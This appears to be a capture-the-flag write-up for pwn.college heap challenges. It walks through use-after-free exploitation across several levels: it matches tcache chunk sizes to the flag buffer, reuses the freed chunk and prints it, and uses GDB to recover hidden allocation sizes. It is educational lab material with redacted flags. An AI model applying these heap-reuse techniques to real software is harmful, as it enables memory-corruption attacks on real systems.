# Dynamic Allocator Misuse

## level 1.0

[Use-After-Free](https://cwe.mitre.org/data/definitions/416.html) vulnerability

On trying, output says read_flag option mallocs 741 bytes
Malloc a chunk of size 741, free that chunk, now read the flag.. that chunk is reused. Now trying to print the freed chunk will print the flag

```shell
This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 741

[*] allocations[0] = malloc(741)
[*] allocations[0] = 0x58b6847bf2c0

[*] Function (malloc/free/puts/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #45     | SIZE: 729 - 744        | COUNT: 1     | HEAD: 0x58b6847bf2c0       | KEY: 0x58b6847bf010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x58b6847bf2c0      | 0                   | 0x2f1 (P)                    | (nil)               | 0x58b6847bf010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(741)
[*] flag_buffer = 0x58b6847bf2c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{xxxxx}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

## level 1.1

Now we don't have the helpful descriptive output

In GDB:

- `b *main+604` (Set a breakpoint at malloc() call when read_flag entered)
- `run` -> Enter "read_flag" -> breakpoint encountered
- `i r` -> rax has value **990**

Replace 741 by 990 in prev solution

## level 2.0

```shell
[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(977)
[*] flag_buffer = 0x5e323065a2c0
[*] read the flag!
```

So, we need to malloc 977 bytes

```shell
[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 977

[*] allocations[0] = malloc(977)
[*] allocations[0] = 0x5e323065a6a0

[*] Function (malloc/free/puts/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #60     | SIZE: 969 - 984        | COUNT: 1     | HEAD: 0x5e323065a6a0       | KEY: 0x5e323065a010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x5e323065a6a0      | 0                   | 0x3e1 (P)                    | (nil)               | 0x5e323065a010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(977)
[*] flag_buffer = 0x5e323065a6a0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{xxxxxxxx}
```

## level 2.1

```shell
[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = 0x62fdc51042a0

[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = 0x62fdc51045c0
```

Difference is 800 bytes

```shell
[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 800

[*] allocations[0] = 0x62fdc51048e0

[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 800

[*] allocations[0] = 0x62fdc5104c10
```

Now, difference is 816 bytes, so read_flag must be malloc-ing 800-16 = 784 bytes

```shell
[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 784

[*] allocations[0] = 0x62fdc5104f40

[*] Function (malloc/free/puts/read_flag/quit): free


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = 0x62fdc5104f40

[*] Function (malloc/free/puts/read_flag/quit): puts

Data: pwn.college{xxxxxx}
```

## level 3.0

An extension to level 1.0

```shell
In this challenge, the flag buffer is allocated 2 times before it is used.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(773)
[*] flag_buffer = 0x604f5a44b2c0
[*] flag_buffer = malloc(773)
[*] flag_buffer = 0x604f5a44b5d0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 0

Size: 773

[*] allocations[0] = malloc(773)
[*] allocations[0] = 0x604f5a44b8e0

[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 1

Size: 773

[*] allocations[1] = malloc(773)
[*] allocations[1] = 0x604f5a44bbf0

[*] Function (malloc/free/puts/read_flag/quit): free

Index: 0

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #47     | SIZE: 761 - 776        | COUNT: 1     | HEAD: 0x604f5a44b8e0       | KEY: 0x604f5a44b010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x604f5a44b8e0      | 0                   | 0x311 (P)                    | (nil)               | 0x604f5a44b010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 1

[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #47     | SIZE: 761 - 776        | COUNT: 2     | HEAD: 0x604f5a44bbf0       | KEY: 0x604f5a44b010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x604f5a44bbf0      | 0                   | 0x311 (P)                    | 0x604f5a44b8e0      | 0x604f5a44b010      |
| 0x604f5a44b8e0      | 0                   | 0x311 (P)                    | (nil)               | 0x604f5a44b010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(773)
[*] flag_buffer = 0x604f5a44bbf0
[*] flag_buffer = malloc(773)
[*] flag_buffer = 0x604f5a44b8e0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

Index: 0

[*] puts(allocations[0])
Data: pwn.college{xxxxxxx}
```

## level 3.1

An extension to level 1.1

Now we don't have the helpful descriptive output

In GDB:

- `b *main+949` (Set a breakpoint at malloc() call when read_flag entered)
- `run` -> Enter "read_flag" -> breakpoint encountered
- `i r` -> rax has value **545**

```shell
[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 0

Size: 545


[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 1

Size: 545


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 0


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 1


[*] Function (malloc/free/puts/read_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/quit): puts

Index: 0

Data: pwn.college{xxxxx}
```
